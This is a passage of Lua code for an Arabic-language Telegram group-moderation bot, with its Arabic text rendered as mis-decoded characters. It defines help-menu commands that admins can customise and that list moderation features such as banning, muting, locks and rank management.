β β« ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
β β« Ψ­Ψ°Ω ΩΨ§Ψ¦ΩΩ Ψ§ΩΩΩΨΉ
ββββ EB ββββ
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ β Ψ§ΩΨ±Ψ§Ψ¨Ψ·
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ β Ψ§ΩΨ§ΩΨΉΨ§Ψ¨
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ β Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ β ΩΨ΄Ω Ψ§ΩΨ§ΨΉΨ―Ψ§Ψ―Ψ§Ψͺ
ββββ EB ββββ
β β« Ψ·Ψ±Ψ― Ψ§ΩΩΨ­Ψ°ΩΩΩΩΩ°Ω
β β« Ψ·Ψ±Ψ― β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΩΨΉΨ±Ω β’ Ψ¨Ψ§ΩΨ§ΩΨ―Ω
β β« ΩΨͺΩ β’ Ψ§ΩΨΊΨ§Ψ‘ ΩΨͺΩ
β β« ΨͺΩΩΨ― β’ Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΨ―
β β« Ψ­ΨΈΨ± β’ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΨΈΨ±
β β« Ψ§ΩΩΩΨͺΩΩΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΩΩΨͺΩΩΩΩ
β β« Ψ§ΩΩΩΩΨ―ΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΩΩΩΨ―ΩΩ
β β« Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΩΨ­ΨΈΩΨ±ΩΩ
ββββ EB ββββ
β β« ΨͺΩΩΩΨ― Ψ―ΩΩΩΩ + ΨΉΨ―Ψ― Ψ§ΩΨ―ΩΨ§Ψ¦Ω
β β« ΨͺΩΩΩΨ― Ψ³Ψ§ΨΉΩ + ΨΉΨ―Ψ― Ψ§ΩΨ³Ψ§ΨΉΨ§Ψͺ
β β« ΨͺΩΩΩΨ― ΩΩΩ + ΨΉΨ―Ψ― Ψ§ΩΨ§ΩΨ§Ω
β β« Ψ§ΩΨΊΨ§Ψ‘ ΨͺΩΩΩΨ― β ΩΨ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΩΩΩΨ― Ψ¨Ψ§ΩΩΩΨͺ
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω3" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± ΩΩ£" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ω3) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help31'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help31'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help3', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "Ω3" or text == "ΩΩ£" or text == "Ψ§ΩΨ§ΩΨ±3" or text == "Ψ§ΩΨ§ΩΨ±Ω£" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΨ?Ψ΅ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ·\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β (Ω6) ΩΨΉΨ±ΨΆ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help3')
local text =  [[*
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΩΩΪΩΰ’ͺΨ’Ϋ½ β β₯‘
ββββ EB ββββ
β β« ΩΨ­Ψ΅ Ψ§ΩΨ¨ΩΨͺ
β β« ΨΆΨΉ Ψ§Ψ³Ω + Ψ§ΩΨ§Ψ³Ω
β β« Ψ§ΨΆΩ β’ Ψ­Ψ°Ω β Ψ±Ψ―
β β« Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
β β« Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ±
β β« Ψ­Ψ°Ω ΩΩΨ§Ψ¦Ω Ψ§ΩΩΩΨΉ
β β« ΩΩΨΉ β Ψ¨Ψ§ΩΨ±Ψ― ΨΉΩΩ ( ΩΩΨ΅Ω β’ Ψ΅ΩΨ±Ω β’ ΩΨͺΨ­Ψ±ΩΩ )
β β« Ψ­Ψ°Ω ΩΨ§Ψ¦ΩΩ ΩΩΨΉ + β β₯‘
( Ψ§ΩΨ΅ΩΨ± β’ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ β’ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ )
ββββ EB ββββ
β β« ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ
β β« Ψ±ΩΨΉ Ψ§Ψ―ΩΩ β’ ΨͺΩΨ²ΩΩ Ψ§Ψ―ΩΩ
β β« Ψ§ΩΨ§Ψ―ΩΩΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΨ§Ψ―ΩΩΩΩ
ββββ EB ββββ
β β« ΨͺΨ«Ψ¨ΩΨͺ
β β« Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ
β β« Ψ§ΨΉΨ§Ψ―Ω Ψ§ΩΨͺΨ«Ψ¨ΩΨͺ
β β« Ψ§ΩΨΊΨ§Ψ‘ ΨͺΨ«Ψ¨ΩΨͺ Ψ§ΩΩΩ
ββββ EB ββββ
β β« ΨͺΨΊΩΨ± Ψ±Ψ― + Ψ§Ψ³Ω Ψ§ΩΨ±ΨͺΨ¨Ω + Ψ§ΩΩΨ΅ β β₯‘
β β« Ψ§ΩΩΨ·ΩΨ± β’ ΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω
β β« Ψ§ΩΩΩΨ΄Ψ¦ β’ Ψ§ΩΩΨ―ΩΨ± β’ Ψ§ΩΨ§Ψ―ΩΩ
β β« Ψ§ΩΩΩΩΨ² β’ Ψ§ΩΩΩΨΈΩ β’ Ψ’ΩΩΨΉΨΆΩΩΩΩ
β β« Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΨ±ΨͺΨ¨
ββββ EB ββββ
β β« ΨͺΨΊΩΩΨ± Ψ§ΩΨ§ΩΨ―Ω β ΩΨͺΨΊΩΩΨ± Ψ§ΩΩΩΩΨ΄Ω
β β« ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω β ΩΨͺΨΉΩΩΩ Ψ§ΩΩΩΩΨ΄Ω
β β« Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ―Ω β ΩΨ­Ψ°Ω Ψ§ΩΩΩΩΨ΄Ω
ββββ EB ββββ
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ + Ψ§ΩΨ§ΩΨ± β β₯‘
β β« Ψ§Ψ·Ψ±Ψ―ΩΩ β’ Ψ§ΩΨ§ΩΨ―Ω Ψ¨Ψ§ΩΨ΅ΩΨ±Ω β’ Ψ§ΩΨ§Ψ¨Ψ±Ψ§Ψ¬
β β« ΩΨΉΨ§ΩΩ Ψ§ΩΨ§Ψ³ΩΨ§Ψ‘ β’ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ³Ψ¨
β β« Ψ§ΩΨ§ΩΨ―Ω β’ ΨͺΨ­ΩΩΩ Ψ§ΩΨ΅ΩΨΊ β’ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨͺΨ­Ψ΄ΩΨ΄
β β« Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ―ΩΨ± β’ Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ± β’ Ψ§ΩΨͺΨ­ΩΩ
β β« ΨΆΨ§ΩΩΩ β’ Ψ­Ψ³Ψ§Ψ¨ Ψ§ΩΨΉΩΨ± β’ Ψ§ΩΨ²Ψ?Ψ±ΩΩ
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω4" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± ΩΩ€" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ω4) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help41'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω" ,  1, "md")
Devmfm:del(mustafa..'mfm:Help41'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help4', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ΩΩ€" or text == "Ω4" or text == "Ψ§ΩΨ§ΩΨ±4" or text == "Ψ§ΩΨ§ΩΨ±Ω€" then
if not Admin(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΨ?Ψ΅ Ψ§ΩΨ±ΨͺΨ¨ Ψ§ΩΨ§ΨΉΩΩ ΩΩΨ·\nβ β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω β (Ω6) ΩΨΉΨ±ΨΆ Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help4')
local text =  [[*
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω β β₯‘
ββββ EB ββββ
β β« ΨͺΩΨ²ΩΩ Ψ§ΩΩΩ
β β« Ψ§ΩΩΩΨ―ΩΨ§ β’ Ψ§ΩΨ³Ψ­
β β« ΨͺΨ±ΨͺΩΨ¨ Ψ§ΩΨ§ΩΨ§ΩΨ±
β β« Ψ§ΨΆΩ β’ Ψ­Ψ°Ω β Ψ§ΩΨ±
β β« Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
β β« Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ
β β« Ψ§ΨΆΩ ΩΩΨ§Ψ· β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΨ§ΩΨ―Ω
β β« Ψ§ΨΆΩ Ψ±Ψ³Ψ§Ψ¦Ω β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΨ§ΩΨ―Ω
β β« Ψ±ΩΨΉ ΩΩΨΈΩ β’ ΨͺΩΨ²ΩΩ ΩΩΨΈΩ
β β« Ψ§ΩΩΩΨΈΩΩΩΩ°Ω β’ Ψ­Ψ°Ω Ψ§ΩΩΩΨΈΩΩΩΩ°Ω
β β« Ψ±ΩΨΉ ΩΨ―ΩΨ± β’ ΨͺΩΨ²ΩΩ ΩΨ―ΩΨ±
β β« Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ β’ Ψ­Ψ°Ω Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ + Ψ§ΩΨ§ΩΨ± β β₯‘
β β« ΩΨ²ΩΩΩ β’ Ψ§ΩΨ³Ψ­
β β« Ψ§ΩΨ­ΨΈΨ± β’ Ψ§ΩΩΨͺΩ
ββββ EB ββββ
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΩΩΩΨ΄ΩΨ¦ΩΩ°Ω Ψ’ΩΨ’Ψ³Ψ’Ψ³ΩΩΩ β β₯‘
ββββ EB ββββ
β β« ΩΨΆΨΉ ΩΩΨ¨ + Ψ§ΩΩΩΨ¨
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ β Ψ§ΩΨ±ΩΨΉ
β β« Ψ±ΩΨΉ ΩΩΨ΄Ψ¦ β’ ΨͺΩΨ²ΩΩ ΩΩΨ΄Ψ¦
β β« Ψ§ΩΩΩΨ΄Ψ¦ΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β ΩΨ΄Ψ±Ω
β β« Ψ±ΩΨΉ Ψ¨ΩΩ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ
β β« Ψ­Ψ°Ω Ψ§ΩΩΩΨ§Ψ¦Ω
ββββ EB ββββ
β β« Ψ§ΩΨ§ΩΨ± ΩΩΨ΄Ψ¦ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β β₯‘
ββββ EB ββββ
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β ΩΩΨ΄Ψ¦ Ψ§Ψ³Ψ§Ψ³Ω
β β« Ψ­Ψ°Ω Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ 
β β« Ψ§ΩΩΩΨ΄Ψ¦ΩΩ Ψ§ΩΨ§Ψ³Ψ§Ψ³ΩΩΩ 
β β« Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΨ±ΨͺΨ¨
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω5" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± ΩΩ₯" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ω5) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help51'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω " ,  1, "md")
Devmfm:del(mustafa..'mfm:Help51'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help5', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ΩΩ₯" or text == "Ω5" or text == "Ψ§ΩΨ§ΩΨ±5" or text == "Ψ§ΩΨ§ΩΨ±Ω₯" then
if not SudoBot(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, 'β β« ΩΨ°Ψ§ Ψ§ΩΨ§ΩΨ± ΩΩΩΨ·ΩΨ±ΩΩ ΩΩΨ·', 1, 'md')
else
local Help = Devmfm:get(mustafa..'mfm:Help5')
local text =  [[*
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΩΩΨ·ΩΩΰ’ͺΩΩ β β₯‘
ββββ EB ββββ
β β« Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ
β β« Ψ§ΩΩΨ·ΩΨ±ΩΩ
β β« Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ
β β« Ψ§ΩΨ§Ψ­Ψ΅Ψ§Ψ¦ΩΨ§Ψͺ
β β« Ψ§ΩΩΨ¬ΩΩΨΉΨ§Ψͺ
β β« Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ + ΨΊΨ§Ψ―Ψ±
β β« Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ + ΨͺΨΉΨ·ΩΩ
β β« ΩΨ΄Ω + -Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©
ββββ EB ββββ
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β ΩΨ―ΩΨ± ΨΉΨ§Ω
β β« Ψ­Ψ°Ω β’ Ψ§ΩΩΨ―Ψ±Ψ§Ψ‘ Ψ§ΩΨΉΨ§ΩΩΩ 
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β Ψ§Ψ―ΩΩ ΨΉΨ§Ω
β β« Ψ­Ψ°Ω β’ Ψ§ΩΨ§Ψ―ΩΩΩΩ Ψ§ΩΨΉΨ§ΩΩΩ 
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β ΩΩΩΨ² ΨΉΨ§Ω
β β« Ψ­Ψ°Ω β’ Ψ§ΩΩΩΩΨ²ΩΩ ΨΉΨ§Ω 
ββββ EB ββββ
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω β β₯‘
ββββ EB ββββ
β β« ΨͺΨ­Ψ―ΩΨ«
β β« Ψ§ΩΩΩΩΨ§Ψͺ
β β« Ψ§ΩΩΨͺΨ¬Ψ±
β β« Ψ§ΩΨ³ΩΨ±ΩΨ±
β β« Ψ±ΩΨ§Ψ¨Ψ· Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ
β β« ΨͺΨ­Ψ―ΩΨ« Ψ§ΩΨ³ΩΨ±Ψ³
β β« ΨͺΩΨΈΩΩ Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ
β β« ΨͺΩΨΈΩΩ Ψ§ΩΩΨ΄ΨͺΨ±ΩΩΩ
β β« Ψ­Ψ°Ω Ψ¬ΩΩΨΉ Ψ§ΩΩΩΩΨ§Ψͺ
β β« ΨͺΨΉΩΩΩ Ψ§ΩΨ§ΩΨ―Ω Ψ§ΩΨΉΨ§Ω
β β« ΨͺΨΊΩΨ± Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω
β β« Ψ­Ψ°Ω ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
β β« ΨͺΨΊΩΨ± ΩΨΉΩΩΩΨ§Ψͺ Ψ§ΩΨͺΨ±Ψ­ΩΨ¨
β β« ΨΊΨ§Ψ―Ψ± + -Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ©
β β« ΨͺΨΉΩΩΩ ΨΉΨ―Ψ― Ψ§ΩΨ§ΨΉΨΆΨ§Ψ‘ + Ψ§ΩΨΉΨ―Ψ―
β β« Ψ­ΨΈΨ± ΨΉΨ§Ω β’ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω
β β« ΩΨͺΩ ΨΉΨ§Ω β’ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨΉΨ§Ω
β β« ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω β’ Ψ­Ψ°Ω ΩΨ§Ψ¦ΩΩ Ψ§ΩΨΉΨ§Ω
β β« ΩΨΆΨΉ β’ Ψ­Ψ°Ω β Ψ§Ψ³Ω Ψ§ΩΨ¨ΩΨͺ
β β« Ψ§ΨΆΩ β’ Ψ­Ψ°Ω β Ψ±Ψ― ΨΉΨ§Ω
β β« Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ± β’ Ψ­Ψ°Ω Ψ±Ψ―ΩΨ― Ψ§ΩΩΨ·ΩΨ±
β β« ΨͺΨΉΩΩΩ β’ Ψ­Ψ°Ω β’ Ψ¬ΩΨ¨ β Ψ±Ψ― Ψ§ΩΨ?Ψ§Ψ΅
β β« Ψ¬ΩΨ¨ ΩΨ³Ψ?Ω Ψ§ΩΩΨ±ΩΨ¨Ψ§Ψͺ
β β« Ψ±ΩΨΉ Ψ§ΩΩΨ³Ψ?Ω + Ψ¨Ψ§ΩΨ±Ψ― ΨΉΩΩ Ψ§ΩΩΩΩ
β β« ΨͺΨΉΩΩΩ β’ Ψ­Ψ°Ω β ΩΩΨ§Ψ© Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω
β β« Ψ¬ΩΨ¨ ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω
β β« ΨͺΨΊΩΩΨ± β’ Ψ­Ψ°Ω β ΩΩΩΨ΄Ω Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β ΩΨ·ΩΨ±
β β« Ψ§ΩΩΨ·ΩΨ±ΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΩΨ·ΩΨ±ΩΩ
β β« Ψ±ΩΨΉ β’ ΨͺΩΨ²ΩΩ β ΩΨ·ΩΨ± Ψ«Ψ§ΩΩΩ
β β« Ψ§ΩΨ«Ψ§ΩΩΩΩΩ β’ Ψ­Ψ°Ω Ψ§ΩΨ«Ψ§ΩΩΩΩΩ
β β« ΨͺΨΉΩΩΩ β’ Ψ­Ψ°Ω β ΩΩΩΨ΄Ψ© Ψ§ΩΨ§ΩΨ―Ω
β β« Ψ§Ψ°Ψ§ΨΉΩ ΩΩΩΩ Ψ¨Ψ§ΩΨͺΩΨ¬ΩΩ β Ψ¨Ψ§ΩΨ±Ψ―
ββββ EB ββββ
β β« ΨͺΩΨΉΩΩ ΩΩΩ + Ψ§Ψ³Ω Ψ§ΩΩΩΩ
β β« ΨͺΨΉΨ·ΩΩ ΩΩΩ + Ψ§Ψ³Ω Ψ§ΩΩΩΩ
β β« ΨͺΩΨΉΩΩ β’ ΨͺΨΉΨ·ΩΩ + Ψ§ΩΨ§ΩΨ± β β₯‘
β β« Ψ§ΩΨ§Ψ°Ψ§ΨΉΩ β’ Ψ§ΩΨ§Ψ΄ΨͺΨ±Ψ§Ω Ψ§ΩΨ§Ψ¬Ψ¨Ψ§Ψ±Ω
β β« ΨͺΨ±Ψ­ΩΨ¨ Ψ§ΩΨ¨ΩΨͺ β’ Ψ§ΩΩΨΊΨ§Ψ―Ψ±Ω
β β« Ψ§ΩΨ¨ΩΨͺ Ψ§ΩΨ?Ψ―ΩΩ β’ Ψ§ΩΨͺΩΨ§Ψ΅Ω
ββββ EB ββββ
β β«* [πππππΎπ πππΎππ½πΌπ](https://t.me/TEAM_Escobar)
]]
Dev_mfm(msg.chat_id_, msg.id_, 1, (Help or text), 1, 'md')
end end
if text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± Ω6" and SecondSudo(msg) or text == "ΨͺΨΉΩΩΩ Ψ§ΩΨ± ΩΩ¦" and SecondSudo(msg) then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« Ψ’Ωΰ’ͺΨ³Ϋ§Ω ΩΩΩΨ΄Ψ© (Ω6) Ψ§ΩΨ§Ω " ,  1, "md")
Devmfm:set(mustafa..'mfm:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local mustafaTEAM =  Devmfm:get(mustafa..'mfm:Help61'..msg.sender_user_id_)
if mustafaTEAM == 'msg' then
Dev_mfm(msg.chat_id_, msg.id_, 1, "β β« ΨͺΩΩΩΩ Ψ­ΩΨΈ Ψ§ΩΩΩΩΨ΄Ω Ψ§ΩΨ¬Ψ―ΩΨ―Ω" ,  1, "md")
Devmfm:del(mustafa..'mfm:Help61'..msg.sender_user_id_)
Devmfm:set(mustafa..'mfm:Help6', text)
Dev_mfm(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
if text == "ΩΩ¦" or text == "Ω6" or text == "Ψ§ΩΨ§ΩΨ±6" or text == "Ψ§ΩΨ§ΩΨ±Ω¦" then
local Help = Devmfm:get(mustafa..'mfm:Help6')
local text =  [[*
β β« Ψ’ΩΨ’ΩΩΰ’ͺ Ψ’ΩΨ’ΨΉΩΨΆΨ’Ψ₯Ϋ½ β β₯‘
ββββ EB ββββ
β β« Ψ§ΩΨ³ΩΨ±Ψ³ β’ ΩΩΩΨΉΩ β’ Ψ±ΨͺΨ¨ΨͺΩ β’ ΩΨΉΩΩΩΨ§ΨͺΩ
β β« Ψ±Ψ³Ψ§Ψ¦ΩΩ β’ Ψ­Ψ°Ω Ψ±Ψ³Ψ§Ψ¦ΩΩ β’ Ψ§Ψ³ΩΩ β’ ΩΨΉΨ±ΩΩΩΩ° 
β β« Ψ§ΩΨ―Ω β’Ψ§ΩΨ―ΩΩ β’ Ψ¬ΩΨ§ΨͺΩ β’ ΨΊΩΩΩΩ β’ Ψ§ΩΨ§ΩΨΉΨ§Ψ¨ 
β β« ΩΩΨ§Ψ·Ω β’ Ψ¨ΩΨΉ ΩΩΨ§Ψ·Ω β’ Ψ§ΩΩΩΨ§ΩΩΩ β’ Ψ²Ψ?Ψ±ΩΩ 
β β« Ψ±Ψ§Ψ¨Ψ· Ψ§ΩΨ­Ψ°Ω β’ ΩΨ²ΩΩΩ β’ Ψ§Ψ·Ψ±Ψ―ΩΩ β’ Ψ§ΩΩΨ·ΩΨ± 
β β« ΩΩΩ ΨΆΨ§ΩΩΩ β’ ΩΨ΄Ψ§ΩΨ―Ψ§Ψͺ Ψ§ΩΩΩΨ΄ΩΨ± β’ Ψ§ΩΨ±Ψ§Ψ¨Ψ· 
β β« Ψ§ΩΨ―Ω Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© β’ ΩΨΉΩΩΩΨ§Ψͺ Ψ’ΩΩΩΩΨ¬ΩΜ¨ΩΩΫΨΉΨ© 
β β« ΩΨ³Ψ¨Ω Ψ§ΩΨ­Ψ¨ β’ ΩΨ³Ψ¨Ω Ψ§ΩΩΨ±Ω β’ ΩΨ³Ψ¨Ω Ψ§ΩΨΊΨ¨Ψ§Ψ‘ 
β β« ΩΨ³Ψ¨Ω Ψ§ΩΨ±Ψ¬ΩΩΩ β’ ΩΨ³Ψ¨Ω Ψ§ΩΨ§ΩΩΨ«Ω β’ Ψ§ΩΨͺΩΨ§ΨΉΩ
ββββ EB ββββ
β β« Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ
β β« ΩΩΩ + Ψ§ΩΩΩΩΩ
β β« Ψ²Ψ?Ψ±ΩΩ + Ψ§Ψ³ΩΩ
β β« Ψ¨Ψ±Ψ¬ + ΩΩΨΉ Ψ§ΩΨ¨Ψ±Ψ¬
β β« ΩΨΉΩΩ Ψ§Ψ³Ω + Ψ§ΩΨ§Ψ³Ω
β β« Ψ§Ψ­Ψ³Ψ¨ + ΨͺΨ§Ψ±ΩΨ? ΩΩΩΨ§Ψ―Ω
β β« Ψ¨ΩΨ³Ω β’ Ψ¨ΩΨ³ΩΨ§ β Ψ¨Ψ§ΩΨ±Ψ―
β β« Ψ±ΩΨΉ ΩΨ·Ω β’ ΨͺΩΨ²ΩΩ ΩΨ·Ω β’Ψ§ΩΩΨ·Ψ§ΩΩ
β β« ΩΩΩΩ β’ ΩΩΩΩΨ§ β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΩΨΉΨ±Ω
β β« Ψ΅ΩΨ­Ω β’ Ψ΅ΩΨ­ΩΨ§ β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΩΨΉΨ±Ω
β β« Ψ΅ΩΨ§Ψ­ΩΨ§ΨͺΩ β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΩΨΉΨ±Ω β’ Ψ¨Ψ§ΩΨ§ΩΨ―Ω
β β« Ψ§ΩΨ―Ω β’ ΩΨ΄Ω  β Ψ¨Ψ§ΩΨ±Ψ― β’ Ψ¨Ψ§ΩΩΨΉΨ±Ω β’ Ψ¨Ψ§ΩΨ§ΩΨ―Ω
β β« ΨͺΨ­ΩΩΩ + Ψ¨Ψ§ΩΨ±Ψ― β Ψ΅ΩΨ±Ω β’ ΩΩΨ΅Ω β’ Ψ΅ΩΨͺ β’ Ψ¨Ψ΅ΩΩ
